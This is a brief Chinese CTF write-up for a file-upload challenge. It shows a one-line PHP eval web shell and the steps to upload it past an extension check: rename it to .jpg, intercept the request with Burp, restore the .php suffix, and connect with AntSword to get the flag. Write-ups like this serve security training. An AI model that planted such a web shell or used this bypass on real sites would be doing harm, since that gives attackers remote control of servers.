---
title: upload1
date: 2020-09-25 22:50:49
tags: [Writeups, 文件执行漏洞, WEB]
categories: CTF
---

Burp抓包，修改后缀，文件自动执行，连接后台，找到文件，获得flag

<!-- more -->

<img src="upload1/upload_photo.png" width=50%/>

所以先构造php文件

```php
// virus.php
<?php eval("$_POST[a]");
```

改名为virus.php.jpg

上传

<img src="upload1/upload_makeup.png" width=50%/>

重新上传并使用burp抓包

<img src="upload1/burp_intercept.png" width=50%/>

修改一波后缀

<img src="upload1/edited.png" width=50%/>

蚁剑连接即可